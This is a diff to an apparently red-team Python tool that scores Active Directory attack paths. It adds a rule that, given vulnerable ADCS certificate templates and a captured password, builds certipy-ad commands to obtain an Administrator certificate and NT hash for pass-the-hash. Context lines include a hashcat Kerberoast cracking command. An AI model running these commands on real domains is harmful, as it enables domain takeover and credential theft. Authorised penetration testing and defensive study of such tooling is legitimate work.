@@ -1150,6 +1150,44 @@ def run(report, store, ui=None):
                         "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule",
                         "# then PtH the recovered NT hash (see R7)",
                     ], src=edge["src"], line=edge["line"]))
+    # iter-84: R-ADCS-ESC1 chain. Certipy adapter surfaces ESC1-vulnerable
+    # templates as INTERESTING FILES findings + Evidence(kind='cert_template',
+    # esc=['ESC1', ...]). If the operator also has ANY plaintext cred, one
+    # certipy-ad req yields a PFX for Administrator - fastest DA path when
+    # ADCS is misconfigured. Cover ESC1/ESC2/ESC6/ESC9/ESC10/ESC13/ESC15/ESC16
+    # (the "give me a cert as Administrator" family; ESC3/ESC4/ESC5/ESC7 are
+    # multi-step and ESC8/ESC11 are LAB-ONLY).
+    _ESC_REQ_ONE_SHOT = {"ESC1", "ESC2", "ESC6", "ESC9", "ESC10",
+                         "ESC13", "ESC15", "ESC16"}
+    if e.cert_templates and e.creds:
+        # first-known cred as authenticating principal
+        ((_ulc_ac, _pw_ac), _occs_ac) = next(iter(e.creds.items()))
+        _disp_ac = _occs_ac[0][0] if _occs_ac[0][0] != "<user>" else _ulc_ac
+        _dom_esc = store.dominant_domain() or "<dom>"
+        _dc_esc = store.dc_ip() or "<DC-IP>"
+        _emitted_tpls = set()
+        for tpl in e.cert_templates:
+            if tpl["lab_only"]:
+                continue
+            _fires = [esc for esc in tpl["esc"] if esc in _ESC_REQ_ONE_SHOT]
+            if not _fires:
+                continue
+            _tkey = (tpl["template"], tpl["ca"])
+            if _tkey in _emitted_tpls:
+                continue
+            _emitted_tpls.add(_tkey)
+            _esc_tag = ",".join(_fires)
+            chains.append(Chain("R-ADCS-ESC1", "ADCS ESC1 -> Administrator PFX",
+                f"{_esc_tag} template '{tpl['template']}' -> req cert as Administrator",
+                crit=9, conf=0.9, ready=1.4, prox=0.95,      # score 10.77
+                commands=[
+                    f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' -p '{_pw_ac}' "
+                    f"-ca '{tpl['ca']}' -template '{tpl['template']}' "
+                    f"-upn 'administrator@{_dom_esc}' -dc-ip {_dc_esc}",
+                    f"certipy-ad auth -pfx administrator.pfx -dc-ip {_dc_esc}",
+                    f"# certipy prints the NT hash + TGT; PtH via R7 to any host",
+                ], src=tpl["src"], line=tpl["line"]))
+
     # SAM/SYSTEM/SECURITY triad in one dir -> local secretsdump (no network).
     # iter-13: conf=1.0 was 'command will succeed', but conf encodes 'likelihood
     # of access'. SAM gives LOCAL hashes only - useful where the originating
